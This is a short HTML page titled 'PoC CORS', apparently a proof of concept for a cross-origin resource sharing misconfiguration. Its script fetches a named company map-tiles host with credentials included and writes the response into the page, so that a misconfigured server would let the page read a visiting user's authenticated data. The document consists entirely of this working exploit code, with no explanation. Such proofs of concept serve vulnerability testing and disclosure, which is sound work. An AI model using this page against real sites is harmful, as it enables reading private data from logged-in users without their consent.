<!DOCTYPE html>
<html>
  <body>
    <h1>PoC CORS</h1>
    <script>
      fetch("https://map-tiles-cloudfront.grab.com", {
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        document.body.innerHTML += "<pre>" + data + "</pre>";
      })
      .catch(err => {
        document.body.innerHTML += "<p style='color:red'>" + err + "</p>";
      });
    </script>
  </body>
</html>
